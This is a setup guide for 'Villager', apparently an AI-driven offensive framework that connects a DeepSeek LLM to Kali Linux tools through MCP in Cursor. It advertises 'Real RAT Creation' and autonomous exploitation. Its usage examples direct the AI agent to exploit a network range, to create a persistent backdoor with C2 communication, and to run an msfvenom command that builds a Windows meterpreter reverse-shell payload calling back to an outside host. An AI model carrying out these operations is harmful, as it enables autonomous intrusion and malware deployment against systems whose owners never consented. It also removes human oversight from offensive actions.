# Proper Villager Framework Setup Guide

This guide sets up the **proper Villager framework integration** that uses Villager's true architecture instead of HTTP workarounds.

## 🎯 What This Setup Provides

### ✅ **True Villager Architecture**
- **TaskNode**: Core execution unit for task decomposition and execution
- **MCP Client**: Gateway to external tools (Kali Driver, Browser Automation)
- **Agent Scheduler**: LLM orchestration with DeepSeek v3
- **Tools Manager**: Centralized function registry
- **Task Relation Manager**: Manages task dependencies and execution flow

### ✅ **Real Tool Access**
- **Kali Driver (Port 1611)**: Manages Docker containers with Kali Linux
- **Containerized Execution**: All security tools run in isolated environments
- **Thousands of Tools**: Access to actual Kali Linux security tools
- **Real RAT Creation**: Using msfvenom and other real tools

### ✅ **AI-Driven Operations**
- **Task Decomposition**: AI automatically breaks down complex tasks
- **Intelligent Tool Selection**: AI chooses optimal tools based on context
- **Adaptive Strategy**: AI adjusts approach based on results
- **Autonomous Execution**: Self-managing task execution with error recovery

## 🚀 Quick Setup

### 1. Prerequisites

```bash
# Ensure you have Docker installed
sudo apt update
sudo apt install docker.io
sudo systemctl start docker
sudo usermod -aG docker $USER

# Log out and back in for Docker group changes
```

### 2. Environment Setup

```bash
# Set your DeepSeek API key
export DEEPSEEK_API_KEY="your-api-key-here"

# Set OpenAI API key for compatibility
export OPENAI_API_KEY="$DEEPSEEK_API_KEY"
```

### 3. Start Villager

```bash
# Start the proper Villager server
./start_villager_proper.sh
```

### 4. Configure MCP in Cursor

Add this to your `~/.cursor/mcp.json`:

```json
{
  "mcpServers": {
    "villager-proper": {
      "command": "/path/to/your/Villager-AI/villager-venv-new/bin/python3",
      "args": [
        "/path/to/your/Villager-AI/mcp/villager_proper_mcp.py",
        "--debug"
      ],
      "description": "Proper Villager Framework - True TaskNode + MCP Client + Kali Driver Architecture",
      "timeout": 300,
      "alwaysAllow": [],
      "env": {
        "PYTHONUNBUFFERED": "1",
        "PYTHONPATH": "/path/to/your/Villager-AI",
        "DEEPSEEK_API_KEY": "your-api-key-here"
      }
    }
  }
}
```

## 🛠️ Available MCP Tools

### Task Management
- `mcp_villager-proper_create_task` - Create tasks using Villager's TaskNode
- `mcp_villager-proper_get_task_status` - Get task execution status
- `mcp_villager-proper_list_tasks` - List all active tasks

### Agent Orchestration
- `mcp_villager-proper_schedule_agent` - Schedule agents with LLM orchestration

### Tool Management
- `mcp_villager-proper_execute_tool` - Execute Villager's core tools
- `mcp_villager-proper_list_available_tools` - List available tools

### System Integration
- `mcp_villager-proper_get_system_status` - Get comprehensive system status

## 🎯 Usage Examples

### Create a Security Assessment Task

```python
# This will use Villager's TaskNode to decompose and execute
result = mcp_villager-proper_create_task(
    abstract="Comprehensive security assessment of target network",
    description="Perform reconnaissance, vulnerability scanning, and exploitation attempts on 192.168.1.0/24 using appropriate tools from Kali Linux",
    verification="Provide detailed report with findings, vulnerabilities, and exploitation results"
)
```

### Schedule an Agent for Complex Operations

```python
# This uses Villager's Agent Scheduler with LLM orchestration
result = mcp_villager-proper_schedule_agent(
    agent_name="Advanced Pentest Agent",
    task_input="Create a persistent backdoor on the target system using msfvenom and establish C2 communication"
)
```

### Execute Tools Directly

```python
# This uses Villager's Tools Manager
result = mcp_villager-proper_execute_tool(
    tool_name="os_execute_cmd",
    parameters={"system_command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"}
)
```

## 🔍 How It Works

### 1. Task Creation Flow
```
User Request → MCP → Villager TaskNode → Task Decomposition → MCP Client → Kali Driver → Docker Containers
```

### 2. Agent Orchestration Flow
```
User Request → MCP → Agent Scheduler → DeepSeek LLM → Lang Chain → Tools Manager → Execution
```

### 3. Tool Execution Flow
```
User Request → MCP → Tools Manager → pyeval/os_execute_cmd/tool_villager → Real Tool Execution
```

## 🚨 Key Differences from Previous Setup

| Aspect | Previous (HTTP) | Proper Villager |
|--------|----------------|-----------------|
| **Task Management** | HTTP endpoints | TaskNode + Task Manager |
| **Agent Creation** | HTTP POST requests | Agent Scheduler + LLM orchestration |
| **Tool Execution** | Direct shell commands | Tools Manager + Containerized execution |
| **AI Integration** | None | DeepSeek LLM + Lang Chain + Thought Engine |
| **Containerization** | None | Kali Driver + Docker Engine + Kali Containers |
| **MCP Integration** | Custom HTTP MCP | Villager's MCP Client (Port 25989) |
| **Tool Registry** | None | Tools Manager function registry |

## 🔧 Troubleshooting

### Villager Not Available
```bash
# Check if Villager components are properly installed
python -c "
import sys
sys.path.append('/path/to/your/Villager-AI')
try:
    from scheduler.core.init import global_llm
    print('✅ Villager components available')
except ImportError as e:
    print(f'❌ Villager components not available: {e}')
"
```

### MCP Connection Issues
```bash
# Test MCP server directly
python /path/to/your/Villager-AI/mcp/villager_proper_mcp.py --debug
```

### Docker Issues
```bash
# Check Docker status
sudo systemctl status docker
sudo docker ps
```

## 🎉 Benefits

### 1. **True AI-Driven Operations**
- Intelligent task decomposition
- Adaptive strategy based on results
- Self-managing execution with error recovery

### 2. **Real Security Tools**
- Access to actual Kali Linux tools
- Containerized execution environments
- Real RAT creation and exploitation tools

### 3. **Proper Architecture**
- No more HTTP workarounds
- True Villager framework integration
- Scalable container orchestration

### 4. **Advanced Capabilities**
- Task dependency management
- Parallel execution of independent tasks
- Knowledge base integration with RAG

---

*This setup provides the true Villager framework experience with real security tools and AI-driven operations.*
